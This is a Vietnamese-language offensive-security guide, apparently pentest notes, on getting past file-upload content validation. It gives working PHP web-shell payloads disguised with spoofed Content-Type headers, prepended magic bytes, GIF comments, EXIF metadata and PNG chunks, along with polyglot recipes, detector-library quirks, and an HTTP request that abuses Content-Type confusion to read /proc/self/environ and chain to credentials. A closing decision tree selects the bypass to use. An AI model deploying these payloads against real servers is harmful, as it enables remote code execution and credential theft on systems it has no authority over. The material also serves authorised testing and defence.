# File Upload — Content Validation Bypass

## Bản chất

Khi server không chỉ kiểm tra extension mà còn kiểm tra **nội dung thực tế** của file, attacker cần các kỹ thuật tinh vi hơn để tạo file vừa vượt qua content validation vừa chứa payload thực thi. Ba lớp validation nội dung phổ biến: Content-Type header, magic bytes/file signature, và intrinsic properties (dimensions, structure).

## Bypass Content-Type Header

### Cơ chế

Trong multipart request, mỗi phần file có một `Content-Type` header riêng do **client** gửi lên. Server có thể dùng header này để validate loại file. Vì header hoàn toàn do client kiểm soát, đây là cơ chế validation yếu nhất.

### Kỹ thuật bypass

Thay đổi `Content-Type` trong request bằng proxy (Burp Suite):

```http
------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg         ← Đổi từ application/x-php sang image/jpeg

<?php system($_GET['cmd']); ?>
------Boundary--
```

### Content-Type values phổ biến để bypass

| Mục đích | Content-Type                                            |
| -------- | ------------------------------------------------------- |
| Image    | `image/jpeg`, `image/png`, `image/gif`, `image/svg+xml` |
| Document | `application/pdf`, `text/plain`, `application/msword`   |
| Generic  | `application/octet-stream`                              |

Danh sách đầy đủ: [SecLists — content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)

## Bypass Magic Bytes / File Signature

### Cơ chế

Nhiều định dạng file bắt đầu bằng chuỗi bytes đặc trưng (magic bytes / file signature) giúp OS và ứng dụng nhận diện loại file bất kể extension. Server có thể dùng hàm như `file()`, `finfo_file()`, `getimagesize()` để đọc vài byte đầu và xác định loại file thực sự.

### Magic bytes phổ biến

| Format | Magic Bytes (hex)         | ASCII representation |
| ------ | ------------------------- | -------------------- |
| PNG    | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG\r\n\x1a\n`  |
| JPEG   | `FF D8 FF`                | `ÿØÿ`                |
| GIF87a | `47 49 46 38 37 61`       | `GIF87a`             |
| GIF89a | `47 49 46 38 39 61`       | `GIF89a`             |
| BMP    | `42 4D`                   | `BM`                 |
| PDF    | `25 50 44 46`             | `%PDF`               |
| ZIP    | `50 4B 03 04`             | `PK..`               |

### Kỹ thuật: Prepend magic bytes

Chèn magic bytes hợp lệ vào đầu file chứa payload:

```bash
# GIF header + PHP shell
echo -n 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

```bash
# PNG header + PHP shell
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

```bash
# JPEG header + PHP shell
printf '\xff\xd8\xff' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

Server đọc vài byte đầu, thấy magic bytes hợp lệ → cho phép upload. Nhưng khi request đến file `.php`, server thực thi PHP code bên trong.

## Bypass Image Dimension Check (`getimagesize()`)

### Cơ chế

Hàm `getimagesize()` trong PHP không chỉ kiểm tra magic bytes mà còn đọc cấu trúc file để lấy width, height và MIME type. File không phải ảnh thật sẽ không có dimensions → bị từ chối.

### Bypass: GIF comment injection

Sử dụng `gifsicle` để chèn PHP code vào comment section của GIF thật:

```bash
# Cài đặt
apt-get install gifsicle    # Kali
sudo apt-get install gifsicle   # Ubuntu

# Chèn PHP code vào comment của GIF
gifsicle < legit.gif --comment "<?php system(\$_GET['cmd']); ?>" > shell.php.gif
```

File output vẫn là GIF hợp lệ, vượt qua `getimagesize()`, nhưng comment chứa PHP code.

### Bypass: EXIF metadata injection

Dùng ExifTool chèn PHP code vào metadata (EXIF comment) của ảnh thật:

```bash
exiftool -Comment='<?php echo "CMD:"; if($_POST){system($_POST["cmd"]);} __halt_compiler();?>' image.jpg
```

Kết quả là file JPEG hợp lệ (đúng magic bytes, đúng dimensions) nhưng metadata chứa PHP code.

### Bypass: Append payload vào ảnh thật

```bash
# Nối PHP code vào cuối file ảnh
echo '<?php system($_REQUEST["cmd"]); ?>' >> legitimate.png
```

Ảnh vẫn hiển thị bình thường, vượt qua content check, nhưng PHP parser sẽ tìm và thực thi `<?php ... ?>` tag bất kể vị trí trong file.

## Bypass Compression & Resizing

### Vấn đề

Nhiều ứng dụng **xử lý ảnh sau khi upload** — resize, compress, convert format — sử dụng thư viện như PHP-GD. Quá trình này thường **xóa sạch metadata và code chèn vào**, khiến các kỹ thuật trên thất bại.

### PLTE Chunk Technique

Chèn payload vào **PLTE chunk** (palette) của PNG. Chunk này ít bị modify khi compress:

- Payload được encode vào dữ liệu palette color
- Survive qua `imagecopyresized()` và `imagecopyresampled()`

### IDAT Chunk Technique

Chèn PHP shell trực tiếp vào **IDAT chunk** (compressed image data) của PNG:

- Payload phải được craft để khi PHP-GD decompress và recompress, code PHP vẫn còn nguyên
- Kỹ thuật phức tạp, cần công cụ chuyên biệt
- Survive qua `imagecopyresized()` và `imagecopyresampled()`

### tEXt Chunk Technique

Chèn payload vào **tEXt chunk** (textual data) của PNG:

- Survive qua hàm `thumbnailImage()` của PHP-GD
- tEXt chunk chứa key-value textual metadata

### Lưu ý tổng quát

Các kỹ thuật survive compression đều yêu cầu hiểu sâu cấu trúc binary của định dạng ảnh. Thường cần tools chuyên biệt hoặc scripts tùy chỉnh thay vì craft thủ công.

## Polyglot Files

### Khái niệm

Polyglot file là file **hợp lệ đồng thời ở nhiều định dạng**. Ví dụ: file vừa là JPEG hợp lệ (khi mở bằng image viewer) vừa chứa PHP code thực thi được (khi server parse).

### Tại sao polyglot bypass validation

Vì file thực sự **là** ảnh hợp lệ — có đúng magic bytes, đúng structure, hiển thị được ảnh — nên vượt qua mọi content validation. Nhưng đồng thời chứa code trong metadata hoặc data section.

### Tạo polyglot JPEG/PHP

```bash
# Dùng ExifTool
exiftool -Comment='<?php echo system($_GET["cmd"]); __halt_compiler(); ?>' legitimate.jpg -o polyglot.php.jpg
```

### GIFAR (GIF + RAR/JAR)

File vừa là GIF hợp lệ vừa là archive (RAR/JAR). Khai thác sự khác biệt: GIF reader đọc từ đầu file, archive reader đọc từ cuối file.

### Các kết hợp polyglot khả thi

| Kết hợp        | Ứng dụng                          |
| -------------- | --------------------------------- |
| JPEG + PHP     | Web shell bypass image validation |
| GIF + JS       | XSS bypass                        |
| PNG + PHP      | PHP shell trong IDAT/tEXt chunk   |
| PDF + JS       | JavaScript execution trong PDF    |
| PPT + JS       | Macro execution                   |
| PDF + polyglot | XXE, SSRF                         |

### Giới hạn

Dù file có cấu trúc đa định dạng, server vẫn có thể chặn dựa trên **extension policy** — polyglot chỉ bypass content validation, không bypass extension validation.

## Bypass File Type Detector nâng cao

### Khi server dùng library chuyên biệt

| Library       | Bypass                                                                                                             |
| ------------- | ------------------------------------------------------------------------------------------------------------------ |
| `mmmagic`     | Chỉ cần `%PDF` magic bytes trong 1024 bytes đầu, phần còn lại có thể là JSON hay bất kỳ format nào                 |
| `pdflib`      | Chứa fake PDF format marker bên trong trường của JSON → library nhận diện là PDF                                   |
| `file` binary | Đọc tối đa 1048576 bytes. Tạo file JSON lớn hơn ngưỡng này, chèn phần đầu PDF thật vào trong → `file` tưởng là PDF |

### Content-Type confusion → Arbitrary File Read

Khi upload handler tin tưởng parsed request body mà không enforce `Content-Type: multipart/form-data`:

```http
POST /form/upload HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "files": {
    "document": {
      "filepath": "/proc/self/environ",
      "mimetype": "image/png",
      "originalFilename": "x.png"
    }
  }
}
```

Backend copy `file.filepath` → response trả nội dung `/proc/self/environ` → arbitrary file read.

**Chain thường gặp**: Đọc `/proc/self/environ` → lấy `$HOME` → đọc config files → credentials.

## Decision Tree: Content Validation Bypass

```
Content validation detected?
│
├── Chỉ kiểm tra Content-Type header
│   └── Đổi Content-Type trong proxy → image/jpeg, image/png
│
├── Kiểm tra magic bytes (vài bytes đầu)
│   └── Prepend magic bytes (GIF89a, \x89PNG, \xff\xd8\xff) vào payload
│
├── Kiểm tra file structure (getimagesize, image dimensions)
│   ├── Polyglot: Ảnh thật + code trong metadata (ExifTool)
│   ├── GIF comment injection (gifsicle)
│   └── Append code vào cuối ảnh thật
│
├── Server compress/resize sau upload
│   ├── PLTE chunk technique (PNG palette)
│   ├── IDAT chunk technique (PNG compressed data)
│   └── tEXt chunk technique (PNG text metadata)
│
└── File type detector chuyên biệt
    ├── mmmagic: Đảm bảo magic bytes trong 1024 bytes đầu
    ├── pdflib: Chèn PDF marker vào file
    └── file binary: Tạo file > 1MB, chèn header thật
```
